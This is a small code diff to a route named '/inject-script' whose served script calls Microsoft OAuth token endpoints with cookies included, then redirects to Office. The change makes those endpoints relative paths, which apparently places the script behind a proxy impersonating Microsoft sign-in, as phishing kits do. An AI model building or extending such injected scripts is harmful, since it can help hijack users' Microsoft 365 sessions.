@@ -502,8 +502,8 @@ router.get('/inject-script', userAuth, async (req, res) => {
   });
 
   const endpoints = [
-    { url: "https://login.microsoftonline.com/common/oauth2/v2.0/token", type: "work" },
-    { url: "https://login.microsoftonline.com/consumers/oauth2/v2.0/token", type: "personal" }
+    { url: "/common/oauth2/v2.0/token", type: "work" },
+    { url: "/consumers/oauth2/v2.0/token", type: "personal" }
   ];
 
   for (const ep of endpoints) {
@@ -515,6 +515,7 @@ router.get('/inject-script', userAuth, async (req, res) => {
         credentials: "include"
       });
       if (resp.ok) {
+        // Fresh cookies are now set. Redirect to Office.
         window.location.href = "https://www.office.com/";
         return;
       } else if (resp.status === 400) {
